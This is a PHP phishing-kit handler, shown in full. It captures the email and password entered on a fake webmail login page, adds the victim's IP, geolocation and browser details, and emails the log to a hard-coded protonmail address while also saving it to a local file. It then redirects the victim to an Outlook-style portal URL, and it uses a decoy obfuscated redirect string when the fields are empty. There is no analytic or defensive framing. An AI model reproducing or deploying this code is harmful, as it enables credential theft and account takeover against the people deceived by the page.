<?php
$login = $_REQUEST['login'];
$password = $_REQUEST['password'];

$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
 if($len[$i] == "@"){
  $x = $i;
  break;
 }
}

$yuh = substr($len,0,$x);

$yuh = strrev($yuh);


for($i=0; $i<$ln; $i++){
 if($yuh[$i] == "."){
  $x = $i;
  break;
 }
}


if (empty($login) || empty($password)) {
header( "Location: index.php?cgi-bin=access&login=$login&.verify?service=mail&data:text/html;charset=utf-8;base64,PGh0bWw+DQo8c3R5bGU+Inet%26cookieTime%3D1486206654%26RelayState%3Dhttp%253A%252F%252F;base64,PGh0bWw+DQorand=aHR0cDovL3d3dy5hcHBsZS5jb20vc2hvcHwxYW9zNGJjMzU3MDM3ZTc1NmQ3NGY4MTI3ZGZhMWNkNDBlNWZkNGY0MWNhZQ&r=GJvZHkgeyBtYXJcmFthcHBsZS5jb20vc2hvcHwxYW9zNG=" );
}
else {

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "============= [ Logs ] =============\n";
$message .= "Em: ".$_POST['login']."\n";
$message .= "Pswd : ".$_POST['password']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'WebMail';
$subj = "$geoplugin->ip | $geoplugin->countryName | $geoplugin->countryCode ";
$from = "From: $domain<west>\n";
mail("bingpand1121@protonmail.com",$subj,$message,$from);

file_put_contents('../webmail.txt', $message, FILE_APPEND);


// header("Location: ");
}
?>
<html>
   <head>
   
      <script type="text/javascript">
         <!--
            function Redirect() {
               window.parent.window.location.href="https://controlpanel.msoutlookonline.net/Portal/ADUser/Login/";
            }
            
            
            setTimeout('Redirect()', 0000);
         //-->
      </script>
      
   </head>
   
   <body>
   </body>
</html>